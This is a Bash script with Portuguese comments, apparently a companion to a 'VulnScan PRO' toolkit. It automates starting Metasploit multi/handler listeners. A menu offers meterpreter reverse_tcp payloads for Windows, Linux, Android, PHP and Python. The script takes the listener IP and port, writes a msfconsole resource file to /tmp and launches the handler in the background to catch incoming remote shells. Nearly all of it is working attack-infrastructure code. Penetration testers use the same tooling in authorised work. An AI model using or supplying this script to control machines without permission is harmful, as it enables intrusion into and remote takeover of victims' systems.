#!/bin/bash

# ================================================================
#   MSF Handler Automation - VulnScan PRO Complementary Script
#   Automatiza a configuração de handlers do Metasploit para payloads gerados.
# ================================================================

# ── CORES ────────────────────────────────────────────────────────
RED=\'\\033[0;31m\';    LRED=\'\\033[1;31m\'
GREEN=\'\\033[0;32m\';  LGREEN=\'\\033[1;32m\'
YELLOW=\'\\033[1;33m\'; LYELLOW=\'\\033[0;33m\'
CYAN=\'\\033[0;36m\';   LCYAN=\'\\033[1;36m\'
BLUE=\'\\033[0;34m\';   LBLUE=\'\\033[1;34m\'
MAGENTA=\'\\033[0;35m\';LMAGENTA=\'\\033[1;35m\'
WHITE=\'\\033[1;37m\';  GRAY=\'\\033[0;37m\'
DGRAY=\'\\033[1;30m\';  BOLD=\'\\033[1m\'
RESET=\'\\033[0m\'

# ── LOGGING ──────────────────────────────────────────────────────
log() {
    local level="$1"; shift
    local msg="$*"
    local ts=$(date \'+%Y-%m-%d %H:%M:%S\')
    # Assuming LOG_FILE is defined in the main script or we can define a local one
    # For now, just print to stderr
    case "$level" in
        INFO)   echo -e "  ${CYAN}[INFO]${RESET}    $msg" >&2 ;;
        OK)     echo -e "  ${GREEN}[OK]${RESET}      $msg" >&2 ;;
        WARN)   echo -e "  ${YELLOW}[WARN]${RESET}    $msg" >&2 ;;
        ERROR)  echo -e "  ${RED}[ERROR]${RESET}   $msg" >&2 ;;
        STEP)   echo -e "  ${LBLUE}[STEP]${RESET}    $msg" >&2 ;;
        *)
            echo -e "  ${GRAY}[$level]${RESET}    $msg" >&2 ;;
    esac
}

div() { echo -e "  ${DGRAY}$(printf \'%.0s─\' {1..72})${RESET}"; }

# ── MAIN MENU ────────────────────────────────────────────────────
main_menu() {
    clear
    echo -e "${LRED}"
    echo "  ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███████╗ ██████╗ █████╗ ███╗  ██╗"
    echo "  ██║   ██║██║   ██║██║     ████╗  ██║██╔════╝██╔════╝██╔══██╗████╗ ██║"
    echo "  ██║   ██║██║   ██║██║     ██╔██╗ ██║███████╗██║     ███████║██╔██╗██║"
    echo "  ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║╚════██║██║     ██╔══██║██║╚████║"
    echo "   ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║███████║╚██████╗██║  ██║██║ ╚███║"
    echo "    ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚══╝"
    echo -e "${RESET}"
    echo -e "  ${DGRAY}$(printf \'%.0s═\' {1..73})${RESET}"
    echo -e "  ${RED}MSF Handler Automation${RESET}  ${DGRAY}│${RESET}  ${YELLOW}Configura listeners do Metasploit${RESET}"
    echo -e "  ${DGRAY}$(printf \'%.0s═\' {1..73})${RESET}"
    echo ""

    echo -e "  ${BOLD}${WHITE}┌──────────────── CONFIGURAR HANDLER ─────────────────┐${RESET}"
    echo -e "  ${BOLD}${WHITE}│${RESET}  ${CYAN}1)${RESET} windows/meterpreter/reverse_tcp       ${WHITE}│${RESET}"
    echo -e "  ${BOLD}${WHITE}│${RESET}  ${CYAN}2)${RESET} linux/x64/meterpreter/reverse_tcp     ${WHITE}│${RESET}"
    echo -e "  ${BOLD}${WHITE}│${RESET}  ${CYAN}3)${RESET} android/meterpreter/reverse_tcp       ${WHITE}│${RESET}"
    echo -e "  ${BOLD}${WHITE}│${RESET}  ${CYAN}4)${RESET} php/meterpreter/reverse_tcp           ${WHITE}│${RESET}"
    echo -e "  ${BOLD}${WHITE}│${RESET}  ${CYAN}5)${RESET} python/meterpreter/reverse_tcp        ${WHITE}│${RESET}"
    echo -e "  ${BOLD}${WHITE}│${RESET}  ${DGRAY}0)${RESET} Sair                                    ${WHITE}│${RESET}"
    echo -e "  ${BOLD}${WHITE}└─────────────────────────────────────────────────────┘${RESET}"
    echo ""
    echo -ne "  ${YELLOW}▶ Escolha o tipo de payload para configurar o handler:${RESET} "
    read -r H_OPC

    [ "$H_OPC" == "0" ] && exit 0

    local PAYLOAD_TYPE=""
    case "$H_OPC" in
        1) PAYLOAD_TYPE="windows/meterpreter/reverse_tcp" ;;
        2) PAYLOAD_TYPE="linux/x64/meterpreter/reverse_tcp" ;;
        3) PAYLOAD_TYPE="android/meterpreter/reverse_tcp" ;;
        4) PAYLOAD_TYPE="php/meterpreter/reverse_tcp" ;;
        5) PAYLOAD_TYPE="python/meterpreter/reverse_tcp" ;;
        *) log ERROR "Opção inválida"; sleep 2; main_menu ;;
    esac

    echo -ne "  ${CYAN}▶ LHOST (Seu IP para escuta):${RESET} "
    read -r LHOST
    echo -ne "  ${CYAN}▶ LPORT (Porta para escuta):${RESET} "
    read -r LPORT

    if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
        log ERROR "LHOST e LPORT são obrigatórios."
        sleep 2
        main_menu
    fi

    log STEP "Configurando handler para $PAYLOAD_TYPE em $LHOST:$LPORT..."
    
    # Cria o script de recurso para msfconsole
    local MSF_RC_FILE="/tmp/handler_${LHOST}_${LPORT}.rc"
    echo "use exploit/multi/handler" > "$MSF_RC_FILE"
    echo "set payload $PAYLOAD_TYPE" >> "$MSF_RC_FILE"
    echo "set LHOST $LHOST" >> "$MSF_RC_FILE"
    echo "set LPORT $LPORT" >> "$MSF_RC_FILE"
    echo "exploit -j -z" >> "$MSF_RC_FILE" # -j para job, -z para não interagir imediatamente

    log INFO "Iniciando msfconsole com handler..."
    log WARN "Para interagir com a sessão, use 'sessions -i <ID>' dentro do msfconsole."
    
    # Inicia msfconsole em uma nova janela de terminal (ex: gnome-terminal, xterm)
    # Isso é um placeholder. Em um ambiente real, pode ser necessário ajustar.
    # Para execução em background no mesmo terminal, remova o 'xterm -e' e adicione '&'
    # ou use 'screen'/'tmux'.
    if command -v xterm &>/dev/null; then
        xterm -e "msfconsole -r $MSF_RC_FILE; echo -e \"\\n${GREEN}Handler encerrado. Pressione ENTER para fechar.\" ; read" &
    elif command -v gnome-terminal &>/dev/null; then
        gnome-terminal -- bash -c "msfconsole -r $MSF_RC_FILE; echo -e \"\\n${GREEN}Handler encerrado. Pressione ENTER para fechar.\" ; read" &
    else
        log WARN "Nenhum emulador de terminal gráfico encontrado (xterm, gnome-terminal)."
        log INFO "Tentando iniciar msfconsole no terminal atual. Use Ctrl+Z para background e 'bg' para continuar."
        msfconsole -r "$MSF_RC_FILE" &
    fi

    log OK "Handler iniciado em background. Verifique o terminal dedicado ou use 'jobs' para gerenciar."
    echo -ne "  ${GRAY}Pressione ENTER para voltar ao menu principal...${RESET}"
    read -r
    main_menu
}

# ── EXECUÇÃO ─────────────────────────────────────────────────────
main_menu
